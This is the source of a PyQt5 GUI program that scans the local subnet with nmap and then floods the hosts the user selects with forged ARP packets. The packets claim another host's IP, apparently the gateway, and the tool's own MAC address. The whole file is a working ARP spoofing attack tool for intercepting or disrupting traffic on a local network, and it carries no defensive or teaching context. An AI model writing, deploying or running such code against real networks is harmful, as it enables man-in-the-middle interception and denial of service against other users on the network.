#-*- coding:utf8 -*-

import sys
import Ui_gui
import interfaces
from PyQt5 import QtCore, QtGui, QtWidgets
import nmap, socket, re, threading,time,thread
from scapy.all import *
import fcntl
import struct
import netifaces

class MainDialog(QtWidgets.QDialog, Ui_gui.Ui_Dialog, interfaces.Interfaces):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)
        self.online = 0
        self.devices = []
        self.mac = ""
        self.ifaceButton.clicked.connect(self.getIface)

        self.devicesButton.clicked.connect(self.getDevices)
        self.ifaceList.itemClicked.connect(self.getDevices)
        self.arpButton.clicked.connect(self.sendArp)
        self.stop.clicked.connect(self.stopAction)
    
    def stopAction(self):
        self.status.setText("Status: Stoped")
        self.online = 0

    def send(self):
        if self.online == 1:
            while True:
                for d in self.devices:
                    self.arp=scapy.all.ARP(op=1,psrc=self.sp,pdst=d,hwdst=self.mac)
                    # self.log.append(self.sp+" "+d+" "+self.mac)
                    # self.log.moveCursor(QtGui.QTextCursor.End)
                    send(self.arp)
                
                if self.online == 0:
                    break

    def sendArp(self):
        self.status.setText("Status: Started - Working")
        self.online = 1
        for device in self.devicesList.selectedItems():
            self.devices.append(device.text())
        thread.start_new_thread(self.send, ())

    def getDevieThread(self):
        iface = self.ifaceList.currentItem().text()

        self.mac= self.getMac(iface)
        local = self.get_interface_ip(iface).split(".")
        hosts_ip = local[0]+'.'+local[1]+'.'+local[2]
        nm = nmap.PortScanner()
        nm.scan(hosts=hosts_ip+'.0/24', arguments='-n -sP -PE -PA21,23,80,3389')
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
        hosts = []
        for host, status in hosts_list:
            spoof=re.findall("('(.+?)',)",str(hosts_list[0][:1]))
            self.sp = spoof[0][1]
            self.devicesList.clear()
            hosts.append(host)

        self.devicesList.addItems(hosts)

    def getDevices(self):
        self.devicesList.clear()
        thread.start_new_thread(self.getDevieThread, ())

    def getIface(self):
        self.ifaceList.clear()
        self.ifaceList.addItems(self.getInterfaces())


    def getMac(self,ifname):
        return netifaces.ifaddresses(ifname)[netifaces.AF_LINK][0]["addr"]

    def get_interface_ip(self,ifname):
        return netifaces.ifaddresses(ifname)[2][0]["addr"]

    def get_lan_ip(self):
        ip = socket.gethostbyname(socket.gethostname())
        if ip.startswith("127.") and os.name != "nt":
            interfaces = netifaces.interfaces()
            for ifname in interfaces:
                try:
                    ip = self.get_interface_ip(ifname)
                    break
                except IOError:
                    pass
        return ip


app = QtWidgets.QApplication(sys.argv)
form = MainDialog()
form.show()
app.exec_()